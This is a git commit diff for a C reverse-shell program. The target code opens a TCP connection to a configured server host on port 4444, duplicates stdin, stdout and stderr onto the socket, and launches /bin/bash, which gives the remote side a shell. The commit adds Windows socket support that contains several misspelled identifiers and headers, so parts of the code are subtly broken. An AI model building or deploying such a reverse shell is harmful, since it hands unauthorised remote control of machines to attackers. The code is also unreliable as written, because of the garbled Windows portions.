a9c962e60a1c7fc482e310cab9bc8d974f2f3925
joel <joelsantossouza08@gmail.com>
2025-12-12 16:12:06 +0000

    finish reverse_shell

--- reverse_shell.h
+++ reverse_shell.h
@@ -1,6 +1,31 @@
 #ifndef REVERSE_SHELL_H
 # define REVERSE_SHELL_H
 
+# if defined(_WIN32)
+#  ifndef _WIN32_WINT
+#   define _WIN32_WINT	0x0600
+#  endif
+#  include <winsock2.h>
+#  include <wc2tcpip.h>
+#  pragma comment(lib, ws2_32.lib)
+#  define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
+#  define CLOSESOCKET(s) (closesocket(s))
+#  define GETSOCKETERRNO WASGetLastError()
+
+# else
+#  include <sys/socket.h>
+#  include <netinet/in.h>
+#  include <arpa/inet.h>
+#  include <unistd.h>
+#  include <fcntl.h>
+#  include <string.h>
+#  include <errno.h>
+#  define SOCKET int
+#  define ISVALIDSOCKET(s) ((s) >= 0)
+#  define CLOSESOCKET(s) (close(s))
+#  define GETSOCKETERRNO errno
+# endif
+
 # ifndef PORT
 #  define PORT			4444
 # endif
--- target.c
+++ target.c
@@ -1,25 +1,22 @@
-#include <arpa/inet.h>
-#include <sys/socket.h>
-#include <unistd.h>
 #include "reverse_shell.h"
 
-int	connect_client(int *client_fd)
+int	connect_client(SOCKET *client_fd)
 {
 	struct sockaddr_in	addr_server;
 
 	*client_fd = socket(AF_INET, SOCK_STREAM, 0);
-	if (*client_fd < 0)
+	if (!ISVALIDSOCKET(*client_fd))
 		return (1);
 	addr_server.sin_family = AF_INET;
 	addr_server.sin_port = htons(PORT);
 	if (inet_pton(AF_INET, SERVER_HOST, &addr_server.sin_addr.s_addr) <= 0)
 	{
-		close(*client_fd);
+		CLOSESOCKET(*client_fd);
 		return (1);
 	}
 	if (connect(*client_fd, (struct sockaddr *)&addr_server, sizeof(addr_server)) < 0)
 	{
-		close(*client_fd);
+		CLOSESOCKET(*client_fd);
 		return (1);
 	}
 	return (0);
@@ -27,7 +24,13 @@ int	connect_client(int *client_fd)
 
 int	main(int argc, char **argv, char **envp)
 {
-	int	fd;
+	SOCKET	fd;
+
+	#if defined(_WIN32)
+		WSADATA	d;
+		if (WSAStarup(MAKEWORD(2, 2), &d))
+			return (1);
+	#endif
 
 	(void) argc;
 	(void) argv;
@@ -40,4 +43,8 @@ int	main(int argc, char **argv, char **envp)
 	dup2(fd, 1);
 	dup2(fd, 2);
 	execve("/bin/bash", args, envp);
+
+	#if defined(_WIN32)
+		WSACleanup();
+	#endif
 }
